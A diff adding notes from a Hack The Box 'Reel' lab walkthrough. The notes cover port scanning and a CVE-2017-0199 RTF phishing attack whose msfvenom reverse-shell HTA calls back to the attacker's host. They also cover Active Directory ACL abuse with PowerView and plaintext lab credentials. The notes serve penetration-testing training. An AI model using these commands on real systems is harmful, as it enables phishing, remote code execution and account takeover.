@@ -1,0 +1,122 @@
+https://0xdf.gitlab.io/2018/11/10/htb-reel.html
+
+nmap -sV -sC -p 21,22,25 -oA nmap/initial 10.10.10.77
+Starting Nmap 7.70 ( https://nmap.org ) 
+Nmap scan report for 10.10.10.77
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18  12:19AM       <DIR>          documents
+| ftp-syst:
+|_  SYST: Windows_NT
+22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp open  smtp?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello:
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help:
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions:
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|_    sequence of commands
+|     sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+...[snip]...
+
+ftp 10.10.10.77
+Looking around, there’s a dir documents with three docs:
+readme.txt
+Windows Event Forwarding.docx
+
+exiftool Windows\ Event\ Forwarding.docx ==> nico@megabank.com
+
+At the time of Reel’s release, there was a popular RTF exploit that was being used very commonly in broad-based attacks, CVE-2017-0199.
+
+The Metasploit module description does a good job explaining it at a high level:
+Description: This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a olelink object can make a http(s) request, and execute hta code in response. This bug was originally seen being exploited in the wild starting in Oct 2016. This module was created by reversing a public malware sample.
+
+To exploit CVE-2017-0199, I’ll get the user will open an malicious RTF file, which will make an HTTP request for an HTA file. I’ll want that HTA file to execute code to give me a shell.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta
+https://github.com/bhdresh/CVE-2017-0199
+
+python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.42/msfv.hta -t rtf -x 0
+sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
+
+nc -lvnp 443
+
+Privesc: nico -> tom
+
+type cred.xml
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+I could use that credential to do a PowerShell RunAs (as I did in Bart), but that password works for ssh as tom:
+ssh tom@10.10.10.77 (1ts-mag1c!!!)
+
+I got acls.cvs to my machine i opened smb share to my machine, then did copy acls.cvs \\ip\share\
+I’ll look at “First Degree Object Control” to see what object tom directly controls, and then “Transitive Object Control” to see where that could go if iterated out. Sometimes if the graph is hard to read, the refresh button will redraw it better
+
+This analysis shows the same path to Backup_Admins through claire.
+
+Privesc: tom -> claire
+
+To move to the claire account, I’ll use the WriteOwner permission along with the functionality of PowerView to take the following steps:
+
+Become owner of claire’s ACL
+Get permissions on that ACL
+Use those permissions to change the password
+
+For each of these steps, I’ll need PowerView, and PowerShell. Luckily, there’s a copy in C:\Users\tom\Desktop\AD Audit\BloodHound, so I will start up PowerShell and import it
+
+. .\PowerView.ps1
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
+Set-DomainUserPassword -identity claire -accountpassword $cred
+
+
+ssh claire@10.10.10.77 with the password we created.
+
+Privesc: claire -> Backup_Admins
+From the analysis before, I know that claire has WriteDacl rights on the Backup_Admins group. I can use that to add her to the group. First, see that the only member of the group is ranj
+
+net group backup_admins
+net group backup_admins claire /add
+net group backup_admins
+
+Privesc: Backup_Admins -> Administrator
+icacls Administrator
+
+C:\Users\Administrator\Desktop\Backup Scripts
+Looking through the scripts, at the very top of BackupScript.ps1, there’s this:
+
+# admin password
+$password="Cr4ckMeIfYouC4n!"
+
+ssh administrator@10.10.10.77
+
+
